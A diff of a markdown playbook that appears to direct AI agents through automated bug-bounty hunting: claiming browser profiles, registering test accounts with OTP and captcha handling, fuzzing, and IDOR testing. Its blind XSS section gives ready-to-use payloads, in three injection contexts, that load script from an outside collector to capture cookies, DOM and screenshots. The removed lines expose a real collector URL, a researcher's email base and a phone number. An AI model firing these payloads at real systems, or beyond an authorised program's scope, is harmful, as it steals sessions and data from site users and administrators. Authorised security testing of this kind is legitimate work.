@@ -246,7 +246,7 @@ Run `claim-account.sh` at startup — it atomically races to claim the first fre
 slot and tells you who you are:
 
 ```bash
-ABP=~/Projects/hackbot-misc/.agent-browser-profiles
+ABP={{HACKBOT_MISC_DIR}}/.agent-browser-profiles
 
 # Run this ONCE at the very start of the agent session:
 eval "$(cd "$ABP" && ./claim-account.sh)"
@@ -263,12 +263,12 @@ eval "$(cd "$ABP" && ./claim-account.sh)"
 Check your identity any time:
 ```bash
 echo "I am: $AGENT_BROWSER_ACCOUNT"
-echo "My creds: ~/Projects/hunts/sessions/<target>/$AGENT_BROWSER_ACCOUNT.creds"
+echo "My creds: {{SESSIONS_DIR}}/<target>/$AGENT_BROWSER_ACCOUNT.creds"
 ```
 
 #### Release on clean exit
 ```bash
-cd ~/Projects/hackbot-misc/.agent-browser-profiles && ./release-account.sh
+cd {{HACKBOT_MISC_DIR}}/.agent-browser-profiles && ./release-account.sh
 # frees the slot for the next agent
 ```
 A missed release is not fatal — stale locks from crashed agents are
@@ -287,7 +287,7 @@ when two agents run concurrently** (race condition on the shared file).
 
 ### Profile layout
 One Chrome profile per account under
-`~/Projects/hackbot-misc/.agent-browser-profiles/Profile-<name>`. The profile
+`{{HACKBOT_MISC_DIR}}/.agent-browser-profiles/Profile-<name>`. The profile
 IS the session — cookies/localStorage persist inside it. Every profile is
 cloned from `Profile-Default`, so extensions + config (FoxyProxy, captcha
 solver) are identical everywhere.
@@ -305,7 +305,7 @@ solver) are identical everywhere.
   in the source profile, run `sync-extensions.sh` so the change reaches every
   account profile.
 - **Creds**: durable login credentials live in
-  `~/Projects/hunts/sessions/<domain>/$AGENT_BROWSER_ACCOUNT.creds`.
+  `{{SESSIONS_DIR}}/<domain>/$AGENT_BROWSER_ACCOUNT.creds`.
   The auth state itself lives in the Chrome profile, not a state JSON.
 
 ## UI Bypass via Caido Match & Replace
@@ -329,8 +329,8 @@ account is useless the moment the target requires email verification.
 
 Every registration email MUST follow this pattern:
 ```
-aceproulx+<target>-a@intigriti.me   # userA
-aceproulx+<target>-b@intigriti.me   # userB
+{{EMAIL_BASE}}+<target>-a@{{EMAIL_DOMAIN}}   # userA
+{{EMAIL_BASE}}+<target>-b@{{EMAIL_DOMAIN}}   # userB
 ```
 (`-` also works as the separator if `+` gets stripped by a target's input
 validation — try `+` first, fall back to `-`.) These forward into the
@@ -377,7 +377,7 @@ Extract the OTP/verification code from the message body.
    → scan latest message from the target's sender for the OTP code
 4. Enter the OTP in the browser to complete verification
 5. Write the chosen number into the creds file:
-   echo "phone=+19392529150" >> ~/Projects/hunts/sessions/<target>/userA.creds
+   echo "phone=+19392529150" >> {{SESSIONS_DIR}}/<target>/userA.creds
 ```
 
 **If no SMS arrives within 60 seconds:**
@@ -390,13 +390,13 @@ Extract the OTP/verification code from the message body.
 ### Before registering ANY account, in this order:
 1. **You must have claimed your account first** — `$AGENT_BROWSER_ACCOUNT` must
    be set (see Session Persistence above). Check: `echo $AGENT_BROWSER_ACCOUNT`.
-2. Check `~/Projects/hunts/sessions/<domain>/$AGENT_BROWSER_ACCOUNT.creds` for
+2. Check `{{SESSIONS_DIR}}/<domain>/$AGENT_BROWSER_ACCOUNT.creds` for
    an existing account. If found and not dead/banned, log in with those
    credentials instead of registering a new one.
 3. If no creds file exists, ensure your profile exists (it should — `claim-account.sh`
    validates this, but check anyway):
    ```bash
-   ABP=~/Projects/hackbot-misc/.agent-browser-profiles
+   ABP={{HACKBOT_MISC_DIR}}/.agent-browser-profiles
    [ -d "$ABP/Profile-$AGENT_BROWSER_ACCOUNT" ] || \
      (cd "$ABP" && ./clone-profile.sh "$AGENT_BROWSER_ACCOUNT")
    ```
@@ -410,12 +410,12 @@ Extract the OTP/verification code from the message body.
    ```bash
    # Derive the email suffix: userA → "a", userB → "b"
    SUFFIX=$(echo "$AGENT_BROWSER_ACCOUNT" | sed 's/user//')
-   cat > ~/Projects/hunts/sessions/${TARGET}/$AGENT_BROWSER_ACCOUNT.creds <<EOF
-   email=aceproulx+${TARGET}-${SUFFIX}@intigriti.me
+   cat > {{SESSIONS_DIR}}/${TARGET}/$AGENT_BROWSER_ACCOUNT.creds <<EOF
+   email={{EMAIL_BASE}}+${TARGET}-${SUFFIX}@{{EMAIL_DOMAIN}}
    password=${GENERATED_PASSWORD}
    created=$(date -u +%Y-%m-%dT%H:%M:%SZ)
    EOF
-   chmod 600 ~/Projects/hunts/sessions/${TARGET}/$AGENT_BROWSER_ACCOUNT.creds
+   chmod 600 {{SESSIONS_DIR}}/${TARGET}/$AGENT_BROWSER_ACCOUNT.creds
    ```
    This is not an end-of-hunt cleanup step — do it immediately or a
    crash/pivot mid-hunt loses the account.
@@ -424,7 +424,7 @@ Extract the OTP/verification code from the message body.
 
 ### Workflow (profile-based; curl still the IDOR transport)
 ```bash
-ABP=~/Projects/hackbot-misc/.agent-browser-profiles
+ABP={{HACKBOT_MISC_DIR}}/.agent-browser-profiles
 TARGET=https://example.com
 
 # 0. Bootstrap — each agent runs this ONCE at session start.
@@ -516,7 +516,7 @@ If the target is mostly blind (no reflected output), use Caido Automate with
 `create_automate_session`/`get_automate_entry` or keep the probe small and
 check status/length variance — never assume a silent 200 is a pass.
 
-- **Payloads**: `~/Projects/payloads/coffinxp-payloads`
+- **Payloads**: `{{PAYLOADS_DIR}}`
 - **Path fuzzing**: `Pentester_wordlist.pay`
 - **Parameter fuzzing via Caido Automate**: `batch_send` to fuzz a single
   endpoint — replace values, vary types, add unexpected params. threads=3,
@@ -529,7 +529,7 @@ check status/length variance — never assume a silent 200 is a pass.
 Two collector setups, pick based on what's being tested.
 
 ### Blind XSS — xss.report collector
-Primary collector for blind XSS: `xss.report/c/aceos`. Use this on any input
+Primary collector for blind XSS: `{{BLIND_XSS_URL}}`. Use this on any input
 that isn't reflected back in the immediate response — support tickets,
 usernames, file names/metadata, admin-review queues, log viewers, order
 notes, email templates, user-agent/referer-logged fields, anywhere a
@@ -541,13 +541,13 @@ body, attribute, or a context that already breaks out of an existing tag):
 
 ```html
 <!-- HTML body context -->
-'"><script src=https://xss.report/c/aceos></script>
+'"><script src={{BLIND_XSS_URL}}></script>
 
 <!-- Attribute-breakout / filtered-<script> context -->
-<svg onload="javascript:eval('var a=document.createElement(\'script\');a.src=\'https://xss.report/c/aceos\';document.body.appendChild(a)')" />
+<svg onload="javascript:eval('var a=document.createElement(\'script\');a.src=\'{{BLIND_XSS_URL}}\';document.body.appendChild(a)')" />
 
 <!-- Inline <script> context, no src filtering -->
-<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//xss.report/c/aceos");a.send();</script>
+<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "{{BLIND_XSS_URL}}");a.send();</script>
 ```
 
 Workflow:
@@ -557,7 +557,7 @@ Workflow:
 - Log every field + payload variant used to `interesting.md` so a hit can be
   traced back to the exact injection point later.
 - xss.report is a dashboard-based collector, not email — check
-  `https://xss.report/c/aceos` periodically during a long-running hunt for
+  `{{BLIND_XSS_URL}}` periodically during a long-running hunt for
   fired payloads (source IP, cookies, DOM, screenshot). Don't poll it
   constantly; check after finishing a feature pass or when returning to the
   hunt after a break.
@@ -712,14 +712,14 @@ Step 3: Wait for solve
   remainingMs = 117 500 ms → well within window, proceed immediately
 
 Step 4: Fill form and submit (while token is still live)
-  agent-browser type "#email" "aceproulx+target-a@intigriti.me"
+  agent-browser type "#email" "{{EMAIL_BASE}}+target-a@{{EMAIL_DOMAIN}}"
   agent-browser type "#password" "P@ss9z!mX2"
   agent-browser click "#submit-btn"
   → account created
 
 Step 5: Write creds immediately
-  cat > ~/Projects/hunts/sessions/target/userA.creds << EOF
-  email=aceproulx+target-a@intigriti.me
+  cat > {{SESSIONS_DIR}}/target/userA.creds << EOF
+  email={{EMAIL_BASE}}+target-a@{{EMAIL_DOMAIN}}
   password=P@ss9z!mX2
   created=2026-09-13T18:31:00Z
   EOF
@@ -786,13 +786,13 @@ add a timeout back.
   then `agent-browser open <url>`.
 - **Switch account** (concurrent agents) = set env vars via `use-account.sh`:
   ```bash
-  eval "$(cd ~/Projects/hackbot-misc/.agent-browser-profiles && ./use-account.sh userB)"
+  eval "$(cd {{HACKBOT_MISC_DIR}}/.agent-browser-profiles && ./use-account.sh userB)"
   ```
   This sets `AGENT_BROWSER_PROFILE` (profile dir) AND `AGENT_BROWSER_NAMESPACE`
   (own daemon socket = own Chrome window). The old account's login stays in its
   profile dir — nothing to save or load.
 - **Switch account** (sequential, single agent only) = `switch-account.sh <name>`
-  (in `~/Projects/hackbot-misc/.agent-browser-profiles/`); re-points `config.json`
+  (in `{{HACKBOT_MISC_DIR}}/.agent-browser-profiles/`); re-points `config.json`
   and kills Chrome only for the old profile. Do not use when two agents are live.
 
 ## JXScout — JS Analysis
